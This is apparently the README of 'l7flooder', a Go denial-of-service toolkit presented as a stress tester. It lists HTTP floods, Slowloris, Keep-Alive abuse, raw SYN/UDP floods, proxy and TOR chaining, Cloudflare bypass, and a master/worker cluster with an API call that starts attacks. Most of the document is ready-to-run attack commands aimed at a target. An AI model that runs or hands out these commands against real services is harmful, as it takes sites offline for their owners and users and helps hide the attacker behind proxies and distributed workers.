# l7flooder — Respectable Stress/Flood Toolkit

## Архитектура

```
l7flooder/
├── cmd/
│   ├── l7flooder/         # main.go (CLI)
│   ├── master/            # main.go (master node)
│   └── worker/            # main.go (worker node)
├── internal/
│   ├── attack/            # L7, L4, Slowloris, KeepAlive, Headless
│   ├── proxy/             # Proxy manager, chain, auto-update, TOR
│   ├── metrics/           # Advanced metrics, Prometheus export
│   ├── cluster/           # Master/worker, API, distributed
│   └── utils/             # Randomization, helpers
├── pkg/plugins/           # Plugin system for custom attacks
├── test/                  # Unit/integration tests
├── .github/workflows/     # CI/CD configs
├── go.mod
└── README.md
```

## Фичи
- L7 flood (GET/POST/HEAD, randomization)
- Slowloris, Keep-Alive abuse
- L4 SYN/UDP flood (raw sockets)
- Proxy support (SOCKS5, HTTP, chain, auto-update, TOR)
- Headless mode (chromedp/puppeteer, Cloudflare bypass)
- Distributed (master/worker, API, auto-scaling)
- Advanced metrics (Prometheus, Grafana, logging)
- Plugin system (custom attacks)
- Full documentation, tests, CI/CD

## Примеры запуска
```sh
# L7 flood
./l7flooder -target https://example.com -threads 100 -duration 30 -method GET

# Slowloris
./l7flooder -target https://example.com -threads 1000 -duration 60 -method SLOWLORIS

# Keep-Alive abuse
./l7flooder -target https://example.com -threads 500 -duration 60 -method KEEPALIVE

# L4 SYN flood
sudo ./l7flooder -target example.com:80 -threads 1000 -duration 30 -method L4SYN

# L4 UDP flood
sudo ./l7flooder -target example.com:80 -threads 1000 -duration 30 -method L4UDP

# С прокси (файл или URL)
./l7flooder -target https://example.com -threads 100 -duration 30 -proxies proxies.txt
./l7flooder -target https://example.com -threads 100 -duration 30 -proxies https://api.proxysource.com/list.txt

# Комбинированные режимы
./l7flooder -target https://example.com -threads 1000 -duration 60 -method L4SYN,KEEPALIVE

# Плагин
./l7flooder -target https://example.com -threads 100 -duration 30 -plugin example

# Distributed (кластер)
# Master:
go run cmd/master/main.go -addr :8080
# Worker:
go run cmd/worker/main.go -id worker1 -master http://localhost:8080 -addr :9001
# Запуск атаки через API:
curl -X POST http://localhost:8080/attack -d '{"target":"https://example.com","threads":100,"duration":30,"method":"GET","params":{}}' -H 'Content-Type: application/json'
```

## Расширение: плагины
- Реализация плагинов через AttackPlugin (pkg/plugins)
- Свои плагины через RegisterPlugin
- -plugin <name>

## API master/worker
- POST /register — регистрация воркера
- GET /workers — список воркеров
- POST /attack — запуск атаки (см. пример выше)